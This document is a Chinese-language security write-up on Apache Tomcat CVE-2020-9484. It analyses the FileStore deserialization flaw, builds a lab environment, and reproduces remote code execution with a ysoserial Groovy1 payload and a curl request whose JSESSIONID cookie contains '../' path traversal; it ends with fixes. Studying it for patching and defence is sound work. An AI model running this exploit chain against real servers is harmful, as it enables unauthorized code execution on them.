## **0x01简介**

Apache Tomcat最早是由Sun Microsystems开发的一个Servlet容器，在1999年被捐献给ASF（Apache Software
Foundation），隶属于Jakarta项目，现在已经独立为一个顶级项目。Tomcat主要实现了Java
EE中的Servlet、JSP规范，同时也提供HTTP服务，是市场上非常流行的Java Web容器。

Tomcat 服务器是一个免费的开放源代码的Web
应用服务器，属于轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP
程序的首选。对于一个初学者来说，可以这样认为，当在一台机器上配置好Apache
服务器，可利用它响应HTML（标准通用标记语言下的一个应用）页面的访问请求。实际上Tomcat是Apache
服务器的扩展，但运行时它是独立运行的，所以当你运行tomcat 时，它实际上作为一个与Apache 独立的进程单独运行的。

![1596272354.png!small](https://image.3001.net/images/20200801/1596272354.png!small)

## **0x02漏洞介绍**

北京时间2020年05月20日，Apache官方发布了 Apache Tomcat 远程代码执行 的风险通告，该漏洞编号为 CVE-2020-9484。

Apache Tomcat 是一个开放源代码、运行servlet和JSP
Web应用软件的基于Java的Web应用软件容器。当Tomcat使用了自带session同步功能时，使用不安全的配置（没有使用EncryptInterceptor）会存在反序列化漏洞，攻击者通过精心构造的数据包，
可以对使用了自带session同步功能的Tomcat服务器进行攻击。

成功利用此漏洞需要同时满足以下4个条件:

1.攻击者能够控制服务器上文件的内容和文件名称

2.服务器PersistenceManager配置中使用了FileStore

3.PersistenceManager中的sessionAttributeValueClassNameFilter被配置为“null”，或者过滤器不够严格，导致允许攻击者提供反序列化数据的对象

4.攻击者知道使用的FileStore存储位置到攻击者可控文件的相对路径

## **0x03影响版本**

Apache Tomcat 10.0.0-M1—10.0.0-M4

Apache Tomcat 9.0.0.M1—9.0.34

Apache Tomcat 8.5.0—8.5.54

Apache Tomcat 7.0.0—7.0.103

## **0x04漏洞分析**

根据上面配置的

    
    
    <className="org.apache.catalina.session.FileStore">

，去找tomcat源码。此处使用 Tomcat 10.0.0-M4 来做分析。

查看FileStore的load方法，代码如下

![](https://image.3001.net/images/20200801/1596274140.png!small)

load 会先将 session id 转换成 file object 查看文件是否存在, 如果存在的话会读取文件. file object 会为输入的
id 添加“.session” 后缀，然而并没有验证文件的目录。

![](https://image.3001.net/images/20200801/1596274671.png!small)

当文件存在时, 系统会运行

![](https://image.3001.net/images/20200801/1596274699.png!small)

getObjectInputStream 方法运行 org.apache.catalina.util.CustomObjectInputStream 获取
gadget 类, 然后就反序列化session文件了。

## **0x05环境搭建**

安装tomcat需要java8环境，Java8环境安装教程

https://www.jianshu.com/p/9ec7838411c8

搭建一个tomcat服务，下载tomcat 10.0.0-M4，下载地址：

https://repo1.maven.org/maven2/org/apache/tomcat/tomcat/10.0.0-M4/tomcat-10.0.0-M4.tar.gz

![1596274211.png!small](https://image.3001.net/images/20200801/1596274211.png!small)

在/usr/local/下创建一个tomcat目录，将文件解压进去

    
    
    mkdir /usr/local/tomcat
    
    
    tar -zxvf tomcat-10.0.0-M4.tar.gz -C /usr/local/tomcat/

![1596274239.png!small](https://image.3001.net/images/20200801/1596274239.png!small)

修改/usr/local/tomcat/conf/context.xlm 添加Manager

![](https://image.3001.net/images/20200801/1596274764.png!small)

![1596274268.png!small](https://image.3001.net/images/20200801/1596274268.png!small)

下载groovy-2.3.9.jar，然后将groovy-2.3.9.jar 放入/usr/local/tomcat/lib目录下

在lib下执行：wget
https://repo1.maven.org/maven2/org/codehaus/groovy/groovy/2.3.9/groovy-2.3.9.jar

运行tomcat：/usr/local/tomcat/bin/catalina.sh start

![1596274280.png!small](https://image.3001.net/images/20200801/1596274280.png!small)

浏览器访问http://ip:8080，出现如下界面表示安装成功

![1596274292.png!small](https://image.3001.net/images/20200801/1596274292.png!small)

## **0x06漏洞复现**

下载ysoserial 一个生成java反序列化 payload 的 .jar 包

下载地址：git clone https://github.com/frohoff/ysoserial.git

执行下面语句生成 payload

java -jar ysoserial-master-30099844c6-1.jar Groovy1 "touch /tmp/2333" >
/tmp/test.session

![1596274306.png!small](https://image.3001.net/images/20200801/1596274306.png!small)

在浏览器抓取首页的包添加Cookie: JSESSIONID=../../../../../tmp/test

![1596274316.png!small](https://image.3001.net/images/20200801/1596274316.png!small)

或者直接在环境中执行POC通过JSESSION加载恶意的session持久化文件

curl 'http://172.16.1.186:8080/index.jsp' -H 'Cookie:
JSESSIONID=../../../../../tmp/test'

![1596274329.png!small](https://image.3001.net/images/20200801/1596274329.png!small)

执行 ls /tmp 查看结果

![](https://image.3001.net/images/20200801/1596274433.png!small)

## **0x07修复方式**

升级版本,或者配置WAF，过滤掉../之类的字符串，或者不使用 FileStore。

​

